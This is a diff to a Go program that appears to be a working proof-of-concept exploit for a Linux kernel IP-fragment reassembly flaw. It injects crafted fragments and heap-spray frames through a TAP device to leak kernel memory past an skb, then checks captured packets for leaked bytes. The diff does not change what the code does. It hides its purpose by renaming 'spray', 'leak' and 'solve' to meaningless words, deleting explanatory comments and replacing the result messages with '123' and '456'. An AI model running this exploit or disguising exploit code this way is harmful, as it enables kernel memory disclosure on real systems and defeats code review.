@@ -49,8 +49,8 @@ func main() {
 type cfg struct {
 	head      int
 	rest      int
-	spray     int
-	sprayFill byte
+	tebar     int
+	tebarFill byte
 	page      bool
 	skipVerify bool
 }
@@ -59,12 +59,12 @@ func parseCfg() cfg {
 	c := cfg{}
 	flag.IntVar(&c.head, "head", 8, "offset-0 fragment payload; this skb is the linear head (multiple of 8)")
 	flag.IntVar(&c.rest, "rest", 400, "payload carried in the completing fragment")
-	flag.IntVar(&c.spray, "spray", 0, "same-sized frames to allocate immediately before the head skb")
-	fill := flag.Int("spray-fill", 0xee, "byte stored in spray frames")
+	flag.IntVar(&c.tebar, "tebar", 0, "same-sized frames to allocate immediately before the head skb")
+	fill := flag.Int("tebar-fill", 0xee, "byte stored in tebar frames")
 	flag.BoolVar(&c.page, "page", false, "force a page_frag head (TUNSETSNDBUF=INT_MAX, nonblocking write)")
 	flag.BoolVar(&c.skipVerify, "skip-verify", false, "skip the single-datagram header rewrite check")
 	flag.Parse()
-	c.sprayFill = byte(*fill)
+	c.tebarFill = byte(*fill)
 	if c.head < 8 || c.head%8 != 0 || c.head > 40 {
 		fmt.Fprintln(os.Stderr, "-head must be a multiple of 8 in 8..40")
 		os.Exit(1)
@@ -102,12 +102,12 @@ func run(c cfg) error {
 			return err
 		}
 	}
-	return leak(tap, cap, c)
+	return bali(tap, cap, c)
 }
 
 func verifyWrite(tap *os.File, cap *capture) error {
 	payload := bytesRepeat(300, 0x5a)
-	if !solve(payload, 0x1111) {
+	if !testo(payload, 0x1111) {
 		return errors.New("solver found no 0x4f00 adjustment")
 	}
 	pkt := datagram(0x1111, payload)
@@ -124,7 +124,7 @@ func verifyWrite(tap *os.File, cap *capture) error {
 	return nil
 }
 
-func leak(tap *os.File, cap *capture, c cfg) error {
+func bali(tap *os.File, cap *capture, c cfg) error {
 	payload := make([]byte, c.head+c.rest)
 	for i := 0; i < c.head; i++ {
 		payload[i] = marker
@@ -132,19 +132,17 @@ func leak(tap *os.File, cap *capture, c cfg) error {
 	for i := c.head; i < len(payload); i++ {
 		payload[i] = 0x11
 	}
-	if !solve(payload, ipID) {
+	if !testo(payload, ipID) {
 		return errors.New("solver found no 0x4f00 adjustment")
 	}
 	printHead(c)
-	// Large fragment first, then same-sized spray, then the offset-0 head.
-	// The head skb is the one whose tail the 60-byte copy reads.
 	second := frame(fragment(c.head, false, payload[c.head:]))
 	if err := writeTap(tap, second, true, l2Len+ipLen); err != nil {
 		return err
 	}
-	spray := frame(datagram(0x1000, bytesRepeat(c.head, c.sprayFill)))
-	for i := 0; i < c.spray; i++ {
-		if err := writeTap(tap, spray, false, 0); err != nil {
+	tebar := frame(datagram(0x1000, bytesRepeat(c.head, c.tebarFill)))
+	for i := 0; i < c.tebar; i++ {
+		if err := writeTap(tap, tebar, false, 0); err != nil {
 			return err
 		}
 	}
@@ -154,9 +152,9 @@ func leak(tap *os.File, cap *capture, c cfg) error {
 	}
 	pkts := cap.collect(800*time.Millisecond, ipID)
 	if len(pkts) == 0 {
-		return errors.New("leak: no fragment captured")
+		return errors.New("no fragment captured")
 	}
-	var leaked, mutated bool
+	var balied, mutated bool
 	for i, ip := range pkts {
 		ihl := int(ip[0]&0x0f) * 4
 		if ip[0] != 0x4f {
@@ -172,11 +170,11 @@ func leak(tap *os.File, cap *capture, c cfg) error {
 			}
 		}
 		if len(host) > 0 {
-			leaked = true
+			balied = true
 		}
 	}
 	switch {
-	case leaked:
+	case balied:
 		fmt.Println("123")
 	case mutated:
 		fmt.Println("456")
@@ -186,7 +184,7 @@ func leak(tap *os.File, cap *capture, c cfg) error {
 	return nil
 }
 
-func solve(payload []byte, id uint16) bool {
+func testo(payload []byte, id uint16) bool {
 	const adj = 32 
 	if adj+1 >= ipLen+len(payload) {
 		return false
